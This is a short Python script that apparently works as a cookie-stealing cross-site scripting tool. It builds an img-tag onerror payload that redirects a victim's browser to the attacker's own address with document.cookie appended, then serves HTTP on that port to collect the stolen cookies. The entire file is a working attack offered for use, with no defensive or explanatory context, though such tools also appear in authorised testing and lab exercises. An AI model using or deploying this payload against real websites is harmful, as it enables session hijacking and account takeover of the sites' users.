#!/usr/bin/env python

import util
import sys
import http.server
import socketserver

def generatePayload(type, address, port):
    if type == "img":
        return '<img src="#" onerror="javascript:document.location=\'http://%s:%d/?x=\'+document.cookie">' % (address, port)
    else:
        return None

if __name__ == "__main__":

    if len(sys.argv) < 2:
        print("Usage: %s <type> [port]" % sys.argv[0])
        exit(1)

    listen_port = None if len(sys.argv) < 3 else int(sys.argv[2])
    payload_type = sys.argv[1].lower()

    local_address = util.getAddress()

    # choose random port
    if listen_port is None:
        sock = util.openServer(local_address)
        if not sock:
            exit(1)
        listen_port = sock.getsockname()[1]
        sock.close()

    payload = generatePayload(payload_type, local_address, listen_port)
    if not payload:
        print("Unsupported payload type, choose one of: img")
        exit(1)

    print("Payload:")
    print(payload)
    print()

    Handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer((local_address, listen_port), Handler) as httpd:
        print("serving at port", listen_port)
        httpd.serve_forever()
